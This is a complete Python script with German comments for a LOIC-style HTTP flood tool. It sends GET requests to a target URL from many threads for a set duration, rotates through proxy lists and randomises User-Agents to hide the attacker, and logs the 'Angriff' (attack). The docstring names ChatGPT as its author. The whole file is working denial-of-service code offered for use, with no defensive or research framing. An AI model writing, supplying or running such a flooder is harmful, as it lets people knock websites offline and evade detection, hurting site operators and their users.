#!/usr/bin/env python3
"""
loic_py.py

Ein LOIC-ähnlicher HTTP-Flooder in Python 3, optimiert für Termux oder Linux.
Features:
- Multithreading (viele gleichzeitige Verbindungen)
- Dauer-Limit (Angriff stoppt automatisch nach X Sekunden)
- Optionale Proxy-Unterstützung (über eine Proxy-Liste)
- Zufällige User-Agents (Stealth-Modus)
- Optionale Custom Headers
- Logging aller Requests (Statuscode, Antwortzeit, Fehler)
- CLI-Parameter via argparse

Usage:
    python3 loic_py.py --url http://TARGET --threads 100 --duration 60 --proxy-file proxies.txt --header-file headers.txt --log-file attack.log

Autor: ChatGPT
"""

import argparse
import requests
import threading
import time
import random
import logging
import sys
from itertools import cycle

# --- Default-Liste zufälliger User-Agents (kann beliebig erweitert werden) ---
USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/90.0.4430.93 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 "
    "(KHTML, like Gecko) Chrome/88.0.4324.96 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0.3 Safari/605.1.15",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:85.0) Gecko/20100101 Firefox/85.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_4 like Mac OS X) "
    "AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1",
]

# --- Funktion zum Einlesen von Proxies aus einer Datei ---
def load_proxies(proxy_file):
    proxies = []
    try:
        with open(proxy_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                # Erwartetes Format: http://IP:PORT oder https://IP:PORT
                proxies.append(line)
        if not proxies:
            print(f"[!] Proxy-Datei '{proxy_file}' gefunden, aber keine gültigen Einträge.")
        return proxies
    except FileNotFoundError:
        print(f"[!] Proxy-Datei '{proxy_file}' nicht gefunden. Ignoriere Proxy-Einstellung.")
        return []


# --- Funktion zum Einlesen von Custom Headers aus einer Datei ---
def load_custom_headers(header_file):
    headers = {}
    try:
        with open(header_file, 'r') as f:
            for line in f:
                line = line.strip()
                if not line or ':' not in line:
                    continue
                parts = line.split(':', 1)
                key = parts[0].strip()
                value = parts[1].strip()
                headers[key] = value
        if not headers:
            print(f"[!] Header-Datei '{header_file}' gefunden, aber keine gültigen Header.")
        return headers
    except FileNotFoundError:
        print(f"[!] Header-Datei '{header_file}' nicht gefunden. Ignoriere Custom Headers.")
        return {}


# --- Haupt-Klasse für den Flooding-Worker ---
class FloodWorker(threading.Thread):
    def __init__(self, thread_id, url, stop_event, proxy_cycle, custom_headers, timeout):
        super().__init__()
        self.thread_id = thread_id
        self.url = url
        self.stop_event = stop_event
        self.proxy_cycle = proxy_cycle       # cycle von Proxy-Strings oder [None]
        self.custom_headers = custom_headers # dict bzw. {}
        self.timeout = timeout               # float, z.B. 5.0 seconds

    def run(self):
        session = requests.Session()
        while not self.stop_event.is_set():
            # Zufälliger User-Agent aus der Liste
            ua = random.choice(USER_AGENTS)
            headers = {
                'User-Agent': ua,
                **self.custom_headers
            }

            # Proxy-Auswahl (round-robin)
            proxy = None
            if self.proxy_cycle:
                proxy_addr = next(self.proxy_cycle)
                proxy = {"http": proxy_addr, "https": proxy_addr}

            start_time = time.time()
            try:
                response = session.get(
                    self.url,
                    headers=headers,
                    proxies=proxy if proxy else None,
                    timeout=self.timeout
                )
                latency = (time.time() - start_time) * 1000  # in ms
                logging.info(
                    f"[Thread {self.thread_id}] "
                    f"Status: {response.status_code}, "
                    f"Zeit: {latency:.2f} ms, "
                    f"Proxy: {proxy_addr if proxy else 'none'}"
                )
            except requests.exceptions.RequestException as e:
                latency = (time.time() - start_time) * 1000
                logging.warning(
                    f"[Thread {self.thread_id}] "
                    f"FEHLER: {e.__class__.__name__}, "
                    f"Zeit: {latency:.2f} ms, "
                    f"Proxy: {proxy_addr if proxy else 'none'}"
                )


def main():
    parser = argparse.ArgumentParser(
        description="LOIC-ähnliches HTTP-Flood-Tool in Python 3 (für Termux/Linux)."
    )
    parser.add_argument('--url',        required=True, help='Ziel-URL (z.B. http://target)')
    parser.add_argument('--threads',    type=int, default=100, help='Anzahl gleichzeitiger Threads (Standard: 100)')
    parser.add_argument('--duration',   type=int, default=60,  help='Angriffsdauer in Sekunden (Standard: 60)')
    parser.add_argument('--proxy-file', help='Dateipfad zu Proxy-Liste (eine Zeile = ein Proxy)')
    parser.add_argument('--header-file',help='Dateipfad zu Custom Headern (eine Zeile = Header: Wert)')
    parser.add_argument('--log-file',   default='attack.log', help='Log-Datei (Standard: attack.log)')
    parser.add_argument('--timeout',    type=float, default=5.0,  help='Timeout pro Request in Sekunden (Standard: 5.0)')

    args = parser.parse_args()

    url = args.url
    num_threads = args.threads
    duration = args.duration
    proxy_file = args.proxy_file
    header_file = args.header_file
    log_file = args.log_file
    timeout = args.timeout

    # --- Load Proxies und Custom Headers ---
    proxy_list = load_proxies(proxy_file) if proxy_file else []
    proxy_cycle = cycle(proxy_list) if proxy_list else None
    custom_headers = load_custom_headers(header_file) if header_file else {}

    # --- Logging konfigurieren ---
    logging.basicConfig(
        level=logging.INFO,
        format='%(asctime)s %(levelname)s: %(message)s',
        handlers=[
            logging.FileHandler(log_file, mode='w'),
            logging.StreamHandler(sys.stdout)
        ]
    )
    logging.info(f"Ziel: {url}")
    logging.info(f"Threads: {num_threads}, Dauer: {duration}s, Timeout: {timeout}s")
    if proxy_list:
        logging.info(f"Proxies geladen: {len(proxy_list)} Stück")
    if custom_headers:
        logging.info(f"Custom Headers geladen: {len(custom_headers)} Header")

    # --- Start Time und Stop Event ---
    stop_event = threading.Event()
    threads = []

    # --- Spawn Worker-Threads ---
    for i in range(num_threads):
        worker = FloodWorker(
            thread_id = i + 1,
            url = url,
            stop_event = stop_event,
            proxy_cycle = proxy_cycle,
            custom_headers = custom_headers,
            timeout = timeout
        )
        worker.daemon = True  # beendet sich automatisch, wenn main thread stoppt
        threads.append(worker)
        worker.start()
        time.sleep(0.01)  # kleiner Stagger, damit nicht alle Threads exakt synchron starten

    logging.info("Alle Threads gestartet. Flooding läuft...")

    # --- Sleep bis zum Ende der Dauer ---
    try:
        time.sleep(duration)
    except KeyboardInterrupt:
        logging.info("Manueller Abbruch durch Benutzer (CTRL+C) erkannt.")

    # --- Stopp-Signal ---
    stop_event.set()
    logging.info("Stop-Signal gesetzt. Warte, bis alle Threads enden...")

    # --- Join aller Threads ---
    for t in threads:
        t.join(timeout=1)

    logging.info("Angriff beendet. Logs findest du in '{}'".format(log_file))
    print("Fertig.")


if __name__ == "__main__":
    main()
